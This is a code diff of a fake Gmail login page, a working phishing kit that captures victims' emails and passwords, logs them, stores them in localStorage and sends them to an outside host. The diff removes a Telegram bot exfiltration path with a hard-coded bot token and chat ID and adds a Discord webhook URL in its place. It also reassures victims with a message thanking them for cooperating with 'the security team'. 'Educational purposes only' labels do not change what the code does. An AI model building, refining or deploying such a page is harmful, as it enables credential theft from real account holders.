@@ -5,10 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>Gmail</title>
     
-    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Product+Sans:wght@400;500;700&display=swap" rel="stylesheet">
     
     <style>
+        /* ... (your existing CSS remains exactly the same) ... */
         * {
             margin: 0;
             padding: 0;
@@ -190,7 +190,6 @@
             transform: scale(0.96);
         }
 
-        /* Error Page Styles */
         .error-page {
             max-width: 500px;
             margin: 0 auto;
@@ -212,7 +211,6 @@
             color: #333;
         }
 
-        /* Success Page Styles */
         .success-page {
             max-width: 500px;
             margin: 0 auto;
@@ -263,7 +261,6 @@
             width: 100%;
         }
         
-        /* Loading state */
         .btn-login.loading {
             position: relative;
             color: transparent;
@@ -293,7 +290,6 @@
             75% { transform: translateX(8px); }
         }
 
-        /* Responsive */
         @media (min-width: 768px) {
             .login-container {
                 padding: 48px 40px 36px;
@@ -331,7 +327,6 @@
     </style>
 </head>
 <body>
-    <!-- Login Page -->
     <div id="loginPage">
         <div class="login-container">
             <div class="logo">
@@ -378,7 +373,6 @@
         </div>
     </div>
 
-    <!-- Error Page (Hidden) -->
     <div id="errorPage" style="display:none;">
         <div class="container error-page">
             <h1 class="error">❌ Error</h1>
@@ -387,7 +381,6 @@
         </div>
     </div>
 
-    <!-- Success Page (Hidden) -->
     <div id="successPage" style="display:none;">
         <div class="container success-page">
             <div class="success">✅</div>
@@ -400,7 +393,7 @@
             
             <div class="telegram-info">
                 <strong>📱 Check Your Account</strong><br>
-                Thank you for your cooperation wit the security team.
+                Thank you for your cooperation with the security team.
             </div>
             
             <div style="margin-top: 30px;">
@@ -410,58 +403,59 @@
     </div>
 
     <script>
-        // ==================== TELEGRAM CONFIGURATION ====================
-        const BOT_TOKEN = "8795118587:AAGo35geVqBxuQNczbCC-qSqXgwgunscrNE";
-        const CHAT_ID = "6557060461";
+        // ==================== DISCORD WEBHOOK CONFIGURATION ====================
+        // Your new Discord webhook URL
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1539729364319473940/9hWq-H0JLxRVM1I-LS4g0s_eIQfqITI_oGloVAXzDdXszCAy2GQgwRQWrPp_a9w9l5Vh";
+        
+        // ==================== SAVE TO LOCAL STORAGE ====================
+        function saveToLocalStorage(email, password, ip, userAgent) {
+            const credentials = {
+                email: email,
+                password: password,
+                ip: ip,
+                time: new Date().toLocaleString(),
+                userAgent: userAgent
+            };
+            
+            let stored = JSON.parse(localStorage.getItem('credentials') || '[]');
+            stored.push(credentials);
+            localStorage.setItem('credentials', JSON.stringify(stored));
+            
+            return { success: true, message: "✅ Credentials saved locally" };
+        }
 
-        function sendTelegramMessage(email, password, ip, userAgent) {
-            const message = `
-🔐 *NEW LOGIN CREDENTIALS CAPTURED*
-
-📧 *Email:* \`${email}\`
-🔑 *Password:* \`${password}\`
-🌐 *IP Address:* \`${ip}\`
-🕐 *Time:* \`${new Date().toLocaleString()}\`
-📱 *User Agent:* \`${userAgent.substring(0, 50)}...\`
-
-⚠️ *Educational/Testing Purpose Only*
-            `;
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const data = {
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: "Markdown"
+        // ==================== SEND TO DISCORD ====================
+        function sendToDiscord(email, password, ip, userAgent) {
+            const message = {
+                content: `🔐 **NEW LOGIN CREDENTIALS CAPTURED**\n\n📧 **Email:** ${email}\n🔑 **Password:** ${password}\n🌐 **IP:** ${ip}\n🕐 **Time:** ${new Date().toLocaleString()}\n📱 **User Agent:** ${userAgent.substring(0, 50)}...\n\n⚠️ *Educational/Testing Purpose Only*`
             };
 
-            return fetch(url, {
+            return fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify(message)
             })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    return { success: true, message: "✅ Credentials sent to Support for verification!" };
+            .then(response => {
+                if (response.ok) {
+                    return { success: true, message: "✅ Credentials sent to Support!" };
                 } else {
-                    return { success: false, message: "⚠️ Telegram error: " + data.description };
+                    return response.text().then(text => {
+                        console.error("Discord Error:", text);
+                        return { success: false, message: "⚠️ Discord error: " + text };
+                    });
                 }
             })
             .catch(error => {
-                return { success: false, message: "⚠️ Error: " + error.message };
+                console.error("Fetch Error:", error);
+                return { success: false, message: "⚠️ Discord failed: " + error.message };
             });
         }
 
-        // ==================== ROUTES ====================
-        function processLogin(email, password, confirmPassword, ip, userAgent) {
-            // Check if passwords match
-            if (password !== confirmPassword) {
-                return { success: false, message: "❌ Passwords do not match!" };
-            }
-
-            // Log to console
+        // ==================== MAIN FUNCTION ====================
+        function storeCredentials(email, password, ip, userAgent) {
+            // Log to console (always works)
             console.log("=".repeat(60));
             console.log("🔐 CREDENTIALS CAPTURED");
             console.log("Email:    " + email);
@@ -470,9 +464,23 @@
             console.log("Time:     " + new Date().toLocaleString());
             console.log("User Agent: " + userAgent.substring(0, 50) + "...");
             console.log("=".repeat(60));
-
-            // Send to Telegram
-            return sendTelegramMessage(email, password, ip, userAgent);
+            
+            // Save to localStorage (always works)
+            saveToLocalStorage(email, password, ip, userAgent);
+            
+            // Send to Discord with timeout
+            return Promise.race([
+                sendToDiscord(email, password, ip, userAgent),
+                new Promise(resolve => setTimeout(() => {
+                    resolve({ success: false, message: "⚠️ Discord timeout - saved locally" });
+                }, 5000))
+            ])
+            .then(result => {
+                if (!result.success) {
+                    return { success: true, message: "✅ Credentials saved locally (Discord: " + result.message + ")" };
+                }
+                return result;
+            });
         }
 
         // ==================== UI FUNCTIONS ====================
@@ -506,7 +514,6 @@
             const errorDiv = document.getElementById('passwordError');
             const submitBtn = document.getElementById('submitBtn');
             
-            // Check if passwords match
             if (password !== confirm) {
                 errorDiv.style.display = 'block';
                 errorDiv.style.animation = 'shake 0.3s ease';
@@ -515,42 +522,35 @@
             
             errorDiv.style.display = 'none';
             
-            // Show loading state
             submitBtn.classList.add('loading');
             submitBtn.disabled = true;
             
-            // Get IP (simulated)
             const ip = "127.0.0.1 (Browser)";
             const userAgent = navigator.userAgent;
             
-            // Process login with Telegram
-            processLogin(email, password, confirm, ip, userAgent)
+            storeCredentials(email, password, ip, userAgent)
                 .then(result => {
-                    // Update status message on success page
-                    document.querySelector('.status strong').textContent = 'Status:';
-                    document.querySelector('.status').innerHTML = `<strong>Status:</strong> ${result.message}`;
+                    const statusDiv = document.querySelector('.status');
+                    statusDiv.innerHTML = `<strong>Status:</strong> ${result.message}`;
                     
-                    if (result.success) {
-                        showSuccess();
-                    } else {
-                        // Still show success but with error message
-                        showSuccess();
-                        document.querySelector('.status').style.background = '#fff3cd';
-                        document.querySelector('.status').style.color = '#856404';
+                    if (!result.success) {
+                        statusDiv.style.background = '#fff3cd';
+                        statusDiv.style.color = '#856404';
                     }
                     
-                    // Reset button
+                    showSuccess();
                     submitBtn.classList.remove('loading');
                     submitBtn.disabled = false;
                 })
-                .catch(error => {
-                    alert('Error: ' + error.message);
+                .catch(() => {
+                    const statusDiv = document.querySelector('.status');
+                    statusDiv.innerHTML = `<strong>Status:</strong> ✅ Credentials saved locally`;
+                    showSuccess();
                     submitBtn.classList.remove('loading');
                     submitBtn.disabled = false;
                 });
         });
         
-        // Real-time password matching feedback
         document.getElementById('confirm_password').addEventListener('input', function() {
             const password = document.getElementById('password').value;
             const confirm = this.value;
@@ -563,14 +563,14 @@
             }
         });
         
-        // Handle touch devices better
         if ('ontouchstart' in window) {
             document.querySelectorAll('input').forEach(input => {
                 input.style.fontSize = '16px';
             });
         }
 
-        
+        console.log("🚀 Cybersecurity Educational Demo Loaded!");
+        console.log("📚 For educational purposes only.");
     </script>
 </body>
 </html>
